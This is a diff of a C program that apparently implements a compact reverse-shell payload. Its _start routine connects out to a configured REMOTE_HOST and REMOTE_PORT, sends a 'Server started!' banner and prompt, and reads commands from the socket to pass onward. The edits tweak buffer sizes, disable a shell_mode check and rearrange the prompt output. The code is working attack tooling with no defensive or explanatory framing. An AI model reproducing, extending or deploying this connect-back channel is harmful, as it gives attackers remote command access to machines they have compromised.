@@ -7,16 +7,16 @@ void _start(void)
 {
   struct sockaddr_in sa;
   int i, r;
-  char buf[BUFSIZ];
+  char buf[BUFFER_SIZE];
   struct pollfd evts[1];
   data_t data;
 
   data.command_len = 0;
-  data.shell_mode = 0;
+  // data.shell_mode = 0;
   data.long_symbols = 0x0A2165002E203E0A; // one and two-char strings:  reverse('\n', '> ', '.\0', 'e!\n')
 
 #ifdef LIBC
-  data.libc_addr = get_libc(data.temp, BUFSIZ);
+  data.libc_addr = get_libc(data.temp, BUFFER_SIZE_BIG);
 #endif
 
   // create a socket
@@ -26,15 +26,15 @@ void _start(void)
   sa.sin_addr.s_addr = REMOTE_HOST;
   sa.sin_port = htons(REMOTE_PORT);
 
-  r = connect(data.s, (struct sockaddr *)&sa, sizeof(sa));
+  r = connect(data.s, (struct sockaddr *)&sa, sizeof(struct sockaddr_in));
 
   if (r >= 0)
   {
 #ifndef _COMPACT
-    PRINT_TEXT(data.s, "Server started!\n> ");
-#else
-    PRINT_CHARS(data.s, data.symbols.prompt);
+    PRINT_TEXT(data.s, "Server started!\n");
 #endif
+
+    PRINT_CHARS(data.s, data.symbols.prompt);
 
     evts[0].fd = data.s;
     evts[0].events = POLLIN;
@@ -48,12 +48,12 @@ void _start(void)
         break;
 
       // read from socket and write to stdin
-      r = read(data.s, buf, BUFSIZ);
+      r = read(data.s, buf, BUFFER_SIZE);
       if (!r)
         break;
 
       // write(in[1], buf, len);
-      if (!data.shell_mode)
+      // if (!data.shell_mode)
       {
         for (i = 0; i < r; i++)
         {
